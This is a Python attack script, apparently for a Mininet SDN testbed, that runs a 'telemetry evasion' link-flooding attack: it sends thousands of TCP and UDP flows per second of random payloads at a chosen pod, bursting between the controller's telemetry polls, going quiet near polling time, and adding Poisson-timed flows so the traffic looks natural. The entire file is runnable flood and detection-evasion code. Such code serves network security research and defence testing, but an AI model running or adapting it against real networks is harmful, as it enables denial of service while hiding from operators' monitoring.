#!/usr/bin/env python3
"""
Telemetry Evasion LFA
=====================
Exploits SDN controller's periodic telemetry collection by:
1. Timing attacks between polling intervals
2. Burst traffic that appears normal when averaged
3. Stealthy low-and-slow flows below detection thresholds

Usage:
    mininet> h1 python3 attacks/attack_telemetry_evasion.py --target-pod 2 --poll-interval 2 --duration 300 --rate 4000 &
"""

import socket
import random
import time
import argparse
import threading
import math
import numpy as np
from collections import deque

TOPOLOGY = {
    0: ['10.0.0.1', '10.0.0.2', '10.0.1.1', '10.0.1.2'],
    1: ['10.1.0.1', '10.1.0.2', '10.1.1.1', '10.1.1.2'],
    2: ['10.2.0.1', '10.2.0.2', '10.2.1.1', '10.2.1.2'],
    3: ['10.3.0.1', '10.3.0.2', '10.3.1.1', '10.3.1.2']
}


class BurstTimingController:
    """Control traffic bursts between telemetry polls"""
    
    def __init__(self, poll_interval=2.0, burst_fraction=0.65):
        self.poll_interval = poll_interval
        self.burst_fraction = burst_fraction  # Fraction of interval to burst
        self.start_time = time.time()
        self.cycle_start = self.start_time
    
    def get_current_phase(self):
        """Get current phase within polling cycle (0.0 - 1.0)"""
        elapsed = time.time() - self.cycle_start
        phase = (elapsed % self.poll_interval) / self.poll_interval
        
        # Update cycle start at beginning of new cycle
        if elapsed >= self.poll_interval:
            self.cycle_start = time.time()
        
        return phase
    
    def should_burst_now(self):
        """Determine if we should send burst traffic now"""
        phase = self.get_current_phase()
        
        # Burst at start of cycle, stay quiet near polling time
        # Burst window: [0.0, burst_fraction]
        # Quiet window: [burst_fraction, 1.0]
        return phase < self.burst_fraction
    
    def get_rate_multiplier(self):
        """Get traffic rate multiplier based on phase"""
        phase = self.get_current_phase()
        
        if phase < self.burst_fraction:
            # High rate during burst window
            return 2.5
        else:
            # Very low rate during quiet window
            return 0.1


class StealthyFlowGenerator:
    """Generate flows that evade statistical detection"""
    
    def __init__(self, target_ips, base_rate=4000):
        self.target_ips = target_ips
        self.base_rate = base_rate
        self.active = False
        self.stats = {'flows': 0, 'packets': 0, 'bytes': 0, 'burst_flows': 0, 'quiet_flows': 0}
        self.timing_controller = BurstTimingController(poll_interval=2.0)
    
    def generate_stealthy_tcp_flow(self, target_ip, is_burst):
        """Generate TCP flow with stealthy characteristics"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            source_port = random.randint(10000, 65000)
            sock.bind(('', source_port))
            
            target_port = random.choice([80, 443, 8080, 22, 3306])
            
            try:
                sock.connect((target_ip, target_port))
                
                if is_burst:
                    # Burst mode: moderate packet count
                    num_packets = random.randint(20, 60)
                    packet_size = random.randint(400, 1200)
                    self.stats['burst_flows'] += 1
                else:
                    # Quiet mode: very few packets
                    num_packets = random.randint(2, 8)
                    packet_size = random.randint(100, 400)
                    self.stats['quiet_flows'] += 1
                
                for _ in range(num_packets):
                    payload = bytes([random.randint(0, 255) for _ in range(packet_size)])
                    sock.send(payload)
                    self.stats['bytes'] += packet_size
                    self.stats['packets'] += 1
                    
                    if is_burst:
                        time.sleep(random.uniform(0.001, 0.01))
                    else:
                        time.sleep(random.uniform(0.02, 0.05))
                
            except:
                pass
            finally:
                sock.close()
                self.stats['flows'] += 1
        except:
            pass
    
    def generate_stealthy_udp_flow(self, target_ip, is_burst):
        """Generate UDP flow with timing evasion"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            source_port = random.randint(10000, 65000)
            sock.bind(('', source_port))
            
            target_port = random.choice([53, 123, 161, 514, 5060])
            
            if is_burst:
                num_packets = random.randint(15, 50)
                packet_size = random.randint(300, 1000)
                interval = 0.005
                self.stats['burst_flows'] += 1
            else:
                num_packets = random.randint(3, 10)
                packet_size = random.randint(100, 300)
                interval = 0.03
                self.stats['quiet_flows'] += 1
            
            for _ in range(num_packets):
                payload = bytes([random.randint(0, 255) for _ in range(packet_size)])
                sock.sendto(payload, (target_ip, target_port))
                self.stats['bytes'] += packet_size
                self.stats['packets'] += 1
                time.sleep(interval)
            
            sock.close()
            self.stats['flows'] += 1
        except:
            pass
    
    def run_attack(self, duration):
        """Execute telemetry evasion attack"""
        self.active = True
        start_time = time.time()
        
        print(f"[TELEM-EVADE] Starting telemetry evasion attack")
        print(f"  Base rate: {self.base_rate} flows/sec")
        print(f"  Poll interval: {self.timing_controller.poll_interval}s")
        print(f"  Burst fraction: {self.timing_controller.burst_fraction}")
        
        last_phase_report = 0
        
        while self.active and (time.time() - start_time) < duration:
            target_ip = random.choice(self.target_ips)
            
            # Adjust rate based on timing
            rate_multiplier = self.timing_controller.get_rate_multiplier()
            current_rate = self.base_rate * rate_multiplier
            flow_interval = 1.0 / current_rate if current_rate > 0 else 0.01
            
            is_burst = self.timing_controller.should_burst_now()
            
            # Generate flow
            if random.random() < 0.65:
                self.generate_stealthy_tcp_flow(target_ip, is_burst)
            else:
                self.generate_stealthy_udp_flow(target_ip, is_burst)
            
            time.sleep(flow_interval)
            
            # Progress reporting
            current_phase = self.timing_controller.get_current_phase()
            if int(time.time() - start_time) % 10 == 0 and self.stats['flows'] > 0:
                if abs(current_phase - last_phase_report) > 0.1:
                    elapsed = time.time() - start_time
                    mode = "BURST" if is_burst else "QUIET"
                    print(f"[TELEM-EVADE] {elapsed:.0f}s [{mode}] - "
                          f"Flows: {self.stats['flows']:,}, "
                          f"Phase: {current_phase:.2f}, "
                          f"Rate: {self.stats['flows']/elapsed:.1f} flows/s")
                    last_phase_report = current_phase
        
        self.active = False
        total_time = time.time() - start_time
        print(f"\n[TELEM-EVADE] Attack Complete:")
        print(f"  Total flows:  {self.stats['flows']:,}")
        print(f"  Burst flows:  {self.stats['burst_flows']:,} "
              f"({100*self.stats['burst_flows']/max(1,self.stats['flows']):.1f}%)")
        print(f"  Quiet flows:  {self.stats['quiet_flows']:,} "
              f"({100*self.stats['quiet_flows']/max(1,self.stats['flows']):.1f}%)")
        print(f"  Total pkts:   {self.stats['packets']:,}")
        print(f"  Total bytes:  {self.stats['bytes']:,}")


class PoissonFlowGenerator:
    """Generate flows with Poisson arrival process for naturalness"""
    
    def __init__(self, target_ips, lambda_rate=3000):
        self.target_ips = target_ips
        self.lambda_rate = lambda_rate  # Mean arrival rate
        self.active = False
        self.stats = {'flows': 0, 'packets': 0, 'bytes': 0}
    
    def poisson_interval(self):
        """Generate inter-arrival time from Poisson process"""
        return np.random.exponential(1.0 / self.lambda_rate)
    
    def generate_flow(self, target_ip):
        """Generate single flow"""
        try:
            protocol = 'tcp' if random.random() < 0.6 else 'udp'
            
            if protocol == 'tcp':
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            source_port = random.randint(10000, 65000)
            sock.bind(('', source_port))
            
            target_port = random.choice([80, 443, 8080, 53, 123])
            
            if protocol == 'tcp':
                try:
                    sock.connect((target_ip, target_port))
                    payload = bytes([random.randint(0, 255) for _ in range(random.randint(200, 800))])
                    sock.send(payload)
                    self.stats['bytes'] += len(payload)
                    self.stats['packets'] += 1
                except:
                    pass
                finally:
                    sock.close()
            else:
                num_pkts = random.randint(3, 12)
                for _ in range(num_pkts):
                    payload = bytes([random.randint(0, 255) for _ in range(random.randint(100, 600))])
                    sock.sendto(payload, (target_ip, target_port))
                    self.stats['bytes'] += len(payload)
                    self.stats['packets'] += 1
                sock.close()
            
            self.stats['flows'] += 1
        except:
            pass
    
    def run_attack(self, duration):
        """Execute Poisson-distributed attack"""
        self.active = True
        start_time = time.time()
        
        print(f"[POISSON] Starting Poisson flow generation")
        print(f"  Lambda: {self.lambda_rate} flows/sec")
        
        while self.active and (time.time() - start_time) < duration:
            target_ip = random.choice(self.target_ips)
            self.generate_flow(target_ip)
            time.sleep(self.poisson_interval())
            
            if int(time.time() - start_time) % 15 == 0 and self.stats['flows'] > 0:
                elapsed = time.time() - start_time
                print(f"[POISSON] {elapsed:.0f}s - Flows: {self.stats['flows']:,}")
        
        self.active = False
        print(f"\n[POISSON] Complete: {self.stats['flows']:,} flows")


class TelemetryEvasionAttack:
    """Orchestrate telemetry evasion attack"""
    
    def __init__(self, target_pod, burst_rate=4000, poisson_rate=3000, poll_interval=2.0):
        self.target_ips = TOPOLOGY[target_pod]
        self.burst_gen = StealthyFlowGenerator(self.target_ips, burst_rate)
        self.burst_gen.timing_controller.poll_interval = poll_interval
        self.poisson_gen = PoissonFlowGenerator(self.target_ips, poisson_rate)
    
    def launch(self, duration):
        """Launch coordinated evasion attack"""
        print(f"\n{'='*70}")
        print(f"  Telemetry Evasion LFA Attack")
        print(f"{'='*70}")
        print(f"  Targets:       {', '.join(self.target_ips)}")
        print(f"  Burst rate:    {self.burst_gen.base_rate} flows/sec (timed)")
        print(f"  Poisson rate:  {self.poisson_gen.lambda_rate} flows/sec (natural)")
        print(f"  Poll interval: {self.burst_gen.timing_controller.poll_interval}s")
        print(f"  Duration:      {duration}s")
        total_rate = self.burst_gen.base_rate + self.poisson_gen.lambda_rate
        print(f"  Est. flows:    {total_rate * duration:,}")
        print(f"{'='*70}\n")
        
        threads = []
        
        t1 = threading.Thread(target=self.burst_gen.run_attack, args=(duration,))
        t2 = threading.Thread(target=self.poisson_gen.run_attack, args=(duration,))
        
        threads = [t1, t2]
        
        for t in threads:
            t.start()
            time.sleep(0.2)
        
        for t in threads:
            t.join()
        
        # Aggregate statistics
        total_flows = self.burst_gen.stats['flows'] + self.poisson_gen.stats['flows']
        total_packets = self.burst_gen.stats['packets'] + self.poisson_gen.stats['packets']
        total_bytes = self.burst_gen.stats['bytes'] + self.poisson_gen.stats['bytes']
        
        print(f"\n{'='*70}")
        print(f"  FINAL STATISTICS")
        print(f"{'='*70}")
        print(f"  Burst flows:    {self.burst_gen.stats['flows']:,}")
        print(f"    - Burst mode: {self.burst_gen.stats['burst_flows']:,}")
        print(f"    - Quiet mode: {self.burst_gen.stats['quiet_flows']:,}")
        print(f"  Poisson flows:  {self.poisson_gen.stats['flows']:,}")
        print(f"  {'─'*68}")
        print(f"  Total flows:    {total_flows:,}")
        print(f"  Total packets:  {total_packets:,}")
        print(f"  Total bytes:    {total_bytes:,} ({total_bytes/1e6:.2f} MB)")
        print(f"  Achieved rate:  {total_flows/duration:.1f} flows/s")
        print(f"{'='*70}\n")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Telemetry Evasion LFA')
    parser.add_argument('--target-pod', type=int, default=2, choices=[0,1,2,3])
    parser.add_argument('--duration', type=int, default=300)
    parser.add_argument('--rate', type=int, default=4000,
                        help='Burst traffic rate (flows/sec)')
    parser.add_argument('--poisson-rate', type=int, default=3000,
                        help='Poisson background rate')
    parser.add_argument('--poll-interval', type=float, default=2.0,
                        help='Controller polling interval (seconds)')
    
    args = parser.parse_args()
    
    attack = TelemetryEvasionAttack(
        target_pod=args.target_pod,
        burst_rate=args.rate,
        poisson_rate=args.poisson_rate,
        poll_interval=args.poll_interval
    )
    
    attack.launch(args.duration)
